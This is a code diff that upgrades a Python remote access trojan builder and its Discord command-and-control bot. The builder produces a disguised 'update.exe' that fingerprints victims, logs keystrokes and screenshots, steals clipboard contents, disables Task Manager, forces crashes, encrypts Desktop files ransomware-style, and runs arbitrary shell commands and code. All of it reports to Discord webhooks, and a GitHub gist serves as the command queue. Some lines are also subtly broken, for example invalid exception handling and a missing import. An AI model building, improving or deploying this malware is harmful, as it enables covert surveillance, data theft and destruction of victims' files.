@@ -24,8 +24,8 @@ import os
 import subprocess
 import shutil
 
-webhook_url = input("Discord webhook URL: ").strip()
-command_url = input("Pastebin raw URL (with {}): ").strip()
+webhook_url = input("Discord webhook URL (main one for initial bite): ").strip()
+command_url = input("Gist raw URL (FIXED_RAW_URL): ").strip()
 output_name = "update.exe"
 
 rat_code = f'''
@@ -35,15 +35,16 @@ from pynput.keyboard import Listener, Key
 from cryptography.fernet import Fernet
 import winreg
 
-WEBHOOK_URL = "{webhook_url}"
+WEBHOOK_URL = "{webhook_url}"  # Starts with main, switches on setwebhook
 COMMAND_URL = "{command_url}"
 POLL_INTERVAL = 15
 VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
 KEYLOG_BUFFER = ""
 
 def send(msg="", embed=None, file=None):
-    if msg: msg = f"[{{VICTIM_ID}}] {{msg}}"
-    if embed and "title" in embed: embed["title"] = f"[{{VICTIM_ID}}] {{embed['title']}}"
+    global WEBHOOK_URL
+    if msg: msg = f"[{VICTIM_ID}] {msg}"
+    if embed and "title" in embed: embed["title"] = f"[{VICTIM_ID}] {embed['title']}"
     data = {{"content": msg}}
     if embed: data["embeds"] = [embed]
     files = {{"file": file}} if file else None
@@ -53,7 +54,7 @@ def send(msg="", embed=None, file=None):
 def info():
     try: ip = requests.get("https://api.ipify.org", timeout=5).text
     except: ip = "Unknown"
-    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
+    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {VICTIM_ID}\\n**User:** {getpass.getuser()}\\n**PC:** {socket.gethostname()}\\n**IP:** {ip}", "color": 16711680}}
     send(embed=embed)
 
 def anti_vm():
@@ -77,9 +78,9 @@ def persist():
 def on_press(key):
     global KEYLOG_BUFFER
     try: KEYLOG_BUFFER += key.char
-    except: KEYLOG_BUFFER += f" [{{str(key)}}] "
+    except: KEYLOG_BUFFER += f" [{str(key)}] "
     if len(KEYLOG_BUFFER) > 500:
-        send(f"Keylog dump:\\n{{KEYLOG_BUFFER}}")
+        send("Keylog dump:\\n{KEYLOG_BUFFER}")
         KEYLOG_BUFFER = ""
 
 def screenshot():
@@ -93,18 +94,12 @@ def lock_pc():
     ctypes.windll.user32.LockWorkStation()
     send("Workstation locked")
 
-def disable_tm():
+def toggle_tm(enable=True):
     try:
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
-        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-        send("Task Manager disabled")
-    except: pass
-
-def enable_tm():
-    try:
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
-        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
-        send("Task Manager enabled")
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
+        winreg.CloseKey(key)
+        send(f"Task Manager {'enabled' if enable else 'disabled'}")
     except: pass
 
 def bsod():
@@ -115,42 +110,82 @@ def bsod():
 def encrypt(path=os.path.expanduser("~\\Desktop")):
     key = Fernet.generate_key()
     f = Fernet(key)
-    send(f"ENCRYPTION KEY - SAVE IT: {{key.decode()}}")
+    send(f"ENCRYPTION KEY - SAVE IT: {key.decode()}")
     count = 0
-    exts = (".docx",".pdf",".jpg",".png",".txt",".xlsx")
+    exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
     for root, _, files in os.walk(path):
         for file in files:
             if file.lower().endswith(exts):
                 fp = os.path.join(root, file)
                 try:
-                    with open(fp,"rb") as d: enc = f.encrypt(d.read())
-                    with open(fp+".locked","wb") as o: o.write(enc)
+                    with open(fp, "rb") as d: enc = f.encrypt(d.read())
+                    with open(fp + ".locked", "wb") as o: o.write(enc)
                     os.remove(fp)
                     count += 1
                 except: pass
-    send(f"Encrypted {{count}} files")
+    send(f"Encrypted {count} files in {path}")
 
 def shell(cmd):
     try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
-    except Exception as e: out = str(e)
-    send(f"Shell output:\\n{{out[:3000]}}")
+    except e: out = str(e)
+    send(f"Shell output:\\n{out[:3000]}")
+
+def clipboard():
+    send(f"Clipboard: {pyperclip.paste()}")
+
+def reboot():
+    subprocess.call("shutdown /r /t 0", shell=True)
+    send("Rebooting...")
+
+def shutdown():
+    subprocess.call("shutdown /s /t 0", shell=True)
+    send("Shutting down...")
+
+def runscript(code):
+    try:
+        exec(code)
+        send("Script executed")
+    except e: send(f"Script error: {str(e)}")
+
+def setwebhook(url):
+    global WEBHOOK_URL
+    WEBHOOK_URL = url
+    send("Webhook switched to new URL")
 
 def poll():
     while True:
         try:
             cmds = requests.get(COMMAND_URL, timeout=10).json()
             if str(VICTIM_ID) in cmds:
-                full = cmds[str(VICTIM_ID)].strip()
+                full = cmds[str(VICTIM_ID)].strip().lower()
                 parts = full.split(" ", 1)
-                cmd = parts[0].lower()
+                cmd = parts[0]
                 arg = parts[1] if len(parts) > 1 else ""
-                if cmd in ["ss","screenshot"]: screenshot()
-                elif cmd == "lock": lock_pc()
-                elif cmd == "disabletm": disable_tm()
-                elif cmd == "enabletm": enable_tm()
-                elif cmd == "bsod": bsod()
-                elif cmd == "encrypt": encrypt(arg or None)
-                elif cmd == "shell": shell(arg)
+                send(f"Command received: {full}")
+                if cmd == "ss":
+                    screenshot()
+                elif cmd == "lock":
+                    lock_pc()
+                elif cmd == "disabletm":
+                    toggle_tm(False)
+                elif cmd == "enabletm":
+                    toggle_tm(True)
+                elif cmd == "bsod":
+                    bsod()
+                elif cmd == "encrypt":
+                    encrypt(arg or os.path.expanduser("~\\Desktop"))
+                elif cmd == "shell":
+                    shell(arg)
+                elif cmd == "clipboard":
+                    clipboard()
+                elif cmd == "reboot":
+                    reboot()
+                elif cmd == "shutdown":
+                    shutdown()
+                elif cmd == "runscript":
+                    runscript(arg)
+                elif cmd == "setwebhook":
+                    setwebhook(arg)
         except: pass
         time.sleep(POLL_INTERVAL)
 
@@ -166,7 +201,7 @@ if __name__ == "__main__":
 
 with open("rat.py", "w") as f: f.write(rat_code)
 
-print("Building bulletproof EXE...")
+print("Building upgraded RAT...")
 subprocess.run([
     "pyinstaller","--onefile","--noconsole",
     "--collect-all","pynput",
@@ -180,8 +215,7 @@ shutil.rmtree("__pycache__", ignore_errors=True)
 os.remove("rat.py") if os.path.exists("rat.py") else None
 os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"EXE ready: dist\\{output_name}")
-
+print(f"Upgraded EXE: dist\\{output_name} — rebuilds done forever")
 
 
 
@@ -191,8 +225,8 @@ import requests
 import json
 
 TOKEN = "YOUR_DISCORD_BOT_TOKEN"
-GUILD_ID = 123456789012345678  # Server ID
-LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID — TRIPLE CHECK THIS
+GUILD_ID = 123456789012345678
+LOG_CHANNEL_ID = 987654321098765432
 GIST_ID = "3bc0ef1bad059fdf147b42ea06bca7df"
 GH_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 
@@ -200,7 +234,6 @@ FIXED_RAW_URL = "https://gist.githubusercontent.com/IDKwhyimhereDoyou/3bc0ef1bad
 
 intents = discord.Intents.default()
 intents.message_content = True
-intents.messages = True
 
 client = discord.Client(intents=intents)
 
@@ -211,76 +244,73 @@ def update_gist(commands_dict):
     headers = {"Authorization": f"token {GH_TOKEN}"}
     data = {"files": {"commands.json": {"content": json.dumps(commands_dict)}}}
     r = requests.patch(url, headers=headers, json=data)
-    print(f"[GIST] Update status: {r.status_code}")
+    if r.status_code == 200:
+        print("[+] Gist updated")
+    else:
+        print(f"[-] Gist error: {r.text}")
 
 async def create_victim_section(vid):
     guild = client.get_guild(GUILD_ID)
-    if not guild:
-        print("[FATAL] Wrong GUILD_ID - bot can't see server")
-        return None
     cat = await guild.create_category(f"Victim-{vid}")
     ch = await cat.create_text_channel(f"logs-{vid}", overwrites={
         guild.default_role: discord.PermissionOverwrite(read_messages=False),
         guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
     })
-    print(f"[+] Victim section created for {vid}")
+    # Create webhook in private channel
+    webhook = await ch.create_webhook(name="Victim Exfil")
+    webhook_url = webhook.url
+    # Queue setwebhook to switch RAT to this private webhook
+    current = requests.get(FIXED_RAW_URL).json() or {}
+    current[vid] = f"setwebhook {webhook_url}"
+    update_gist(current)
     return ch
 
 @client.event
 async def on_ready():
-    print(f"[+] Bot online - watching channel ID {LOG_CHANNEL_ID} for bites")
-    print(f"[+] FIXED_RAW_URL: {FIXED_RAW_URL}")
+    print(f"[+] Bot live - FIXED_RAW_URL: {FIXED_RAW_URL}")
 
 @client.event
 async def on_message(message):
-    # LOG EVERY MESSAGE THE BOT SEES - NO FILTERS
-    print(f"\n[RAW MESSAGE] Channel ID: {message.channel.id} | Name: {getattr(message.channel, 'name', 'DM')} | Webhook: {message.webhook_id} | Author: {message.author}")
-    print(f"Content: {message.content}")
-    if message.embeds:
-        for i, embed in enumerate(message.embeds):
-            print(f"Embed {i} title: {embed.title}")
-            print(f"Embed {i} description: {embed.description}")
-            print(f"Embed {i} fields: {embed.fields}")
+    if message.author.bot: return
 
-    # BITE DETECTION - aggressive
-    full_text = message.content
-    for embed in message.embeds:
-        full_text += " " + str(embed.title or "") + " " + str(embed.description or "")
-        for field in embed.fields:
-            full_text += " " + str(field.name) + " " + str(field.value)
-    
-    print(f"[PARSE TEXT] {full_text}")
-
-    # Look for ANY 8-char hex — that's our Victim ID
-    vid_match = re.search(r"([a-f0-9]{8})", full_text, re.IGNORECASE)
-    if vid_match:
-        vid = vid_match.group(1).lower()
-        print(f"[ID FOUND] Possible Victim ID: {vid}")
-        if "bite" in full_text.lower() or "captain" in full_text.lower() or "victim" in full_text.lower():
-            if vid not in known_victims:
-                known_victims.add(vid)
-                print(f"[!!!] NEW BITE CONFIRMED - {vid}")
-                ch = await create_victim_section(vid)
-                if ch:
+    # BITE DETECTION
+    if message.channel.id == LOG_CHANNEL_ID:
+        full_text = message.content
+        for embed in message.embeds:
+            full_text += " " + (embed.title or "") + " " + (embed.description or "")
+        if "WE GOT A BITE CAPTAIN" in full_text.upper():
+            vid_match = re.search(r"([a-f0-9]{8})", full_text)
+            if vid_match:
+                vid = vid_match.group(1)
+                if vid not in known_victims:
+                    known_victims.add(vid)
+                    ch = await create_victim_section(vid)
                     await message.reply(f"**BITE** Victim **{vid}** hooked — Room: {ch.mention}")
+                    # Confirmation from RAT will come to private webhook
 
-    # COMMANDS - tolerant
-    if getattr(message.channel, 'name', '').startswith("logs-") and message.content.startswith("-"):
+    # COMMANDS
+    if message.channel.name.startswith("logs-") and message.content.startswith("-"):
         vid = message.channel.name[5:13]
-        clean_cmd = message.content.lstrip("- ").strip().lower()
-        parts = clean_cmd.split(" ", 1)
+        content = message.content[1:].strip().lower()
+        parts = content.split(" ", 1)
         cmd = parts[0]
         arg = parts[1] if len(parts) > 1 else ""
-        full_cmd = cmd if cmd not in ["encrypt", "shell"] else f"{cmd} {arg}"
         
-        current = {}
-        try:
-            current = requests.get(FIXED_RAW_URL).json()
-        except:
-            pass
+        if cmd == "clear":
+            current = requests.get(FIXED_RAW_URL).json() or {}
+            current.pop(vid, None)
+            update_gist(current)
+            await message.reply(f"Cleared queue for **{vid}**")
+            return
+        
+        full_cmd = cmd
+        if cmd in ["encrypt", "shell", "runscript"]:
+            full_cmd += " " + arg
+        
+        current = requests.get(FIXED_RAW_URL).json() or {}
         current[vid] = full_cmd
         update_gist(current)
         
-        await message.reply(f"**{full_cmd}** queued for **{vid}** — live in <30s")
+        await message.reply(f"**{full_cmd}** queued for **{vid}** — RAT will confirm receipt in <30s")
 
 client.run(TOKEN)
